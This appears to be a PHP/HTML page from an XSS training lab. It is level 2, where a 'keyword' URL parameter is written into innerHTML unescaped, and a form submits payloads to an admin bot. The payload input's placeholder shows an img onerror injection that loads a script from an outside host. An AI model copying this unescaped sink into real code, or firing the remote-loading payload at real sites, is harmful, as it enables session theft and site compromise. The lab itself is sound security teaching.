<?php include '../headers.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 2 - DOM XSS</title>
    <link rel="stylesheet" href="../assets/style.css">
</head>
<body>
    <div class="container">
        <div class="nav">
            <a href="../index.php">Home</a>
        </div>
        <h1 data-text="Level 2: DOM-based XSS">Level 2: DOM-based XSS</h1>
        <p>Your task: Manipulate the DOM to execute JavaScript. Try using the URL parameter 'keyword'.</p>
        
        <div id="result" class="message"></div>

        <script>
            // Vulnerability: Reading from URL and writing to innerHTML
            const urlParams = new URLSearchParams(window.location.search);
            const keyword = urlParams.get('keyword');
            
            if (keyword) {
                document.getElementById('result').innerHTML = "Search results for: " + keyword;
            } else {
                document.getElementById('result').innerText = "No keyword provided. Try adding ?keyword=test to the URL.";
            }
        </script>
        
        <div style="margin-top: 40px; border-top: 1px dashed var(--neon-cyan); padding-top: 20px;">
            <h3>Report to Admin</h3>
            <p>Found a vulnerability? Enter your payload below to notify the admin.</p>
            <div>
                <input type="text" id="payload-input" placeholder="<img src=x onerror=document.body.appendChild(document.createElement('script')).src='//xs.pe/6HW'>">
                <button onclick="AdminBot.send('level2', 'payload-input')">Send to Admin Bot</button>
            </div>
            <div style="margin-top: 10px; font-size: 12px; font-family: 'Share Tech Mono';">
                STATUS: <span id="bot-status" style="color: #666;">IDLE</span>
            </div>
        </div>
    </div>
    <script src="../assets/admin-bot.js"></script>
</body>
</html>